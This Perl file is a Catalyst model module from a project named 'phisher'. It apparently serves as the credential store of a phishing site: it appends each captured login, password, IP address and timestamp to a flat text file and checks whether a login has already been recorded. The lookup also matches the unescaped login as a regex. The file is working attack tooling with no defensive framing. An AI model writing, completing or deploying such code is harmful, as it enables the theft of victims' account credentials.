package phisher::Model::text_db;
use Time::localtime;
use Moose;
use namespace::autoclean;
use strict;
use warnings;
use File::Slurp ':all';

extends 'Catalyst::Model';

__PACKAGE__->config(
    database_file => 'userdb',
);

sub timestamp {
  my $t = localtime;
  return sprintf( "%04d-%02d-%02d_%02d:%02d:%02d",
                  $t->year + 1900, $t->mon + 1, $t->mday,
                  $t->hour, $t->min, $t->sec );
}

sub add {
    my ( $self, $params ) = @_;
 
    my $database_file = $self->{database_file};
 
    write_file $database_file, { append => 1 },
      "$params->{time}|$params->{login}|$params->{pw}|$params->{ip}\n";
}

sub found_in {
	my($self,$login) = @_;
	my $file = $self->{database_file};
	if(! -s $file){
		return 0;
	}
	my $found = 0;
	open(my $fh,'<',$file);
	while(<$fh>){
		chomp $_;
		$found = $_ =~ m#$login#gxms;
		if($found){
			last;
		}
	}
	close($fh);
	return $found;
}


=head1 NAME

phisher::Model::text_db - Catalyst Model

=head1 DESCRIPTION

Catalyst Model.


=encoding utf8

=head1 AUTHOR

root

=head1 LICENSE

This library is free software. You can redistribute it and/or modify
it under the same terms as Perl itself.

=cut

__PACKAGE__->meta->make_immutable;

1;
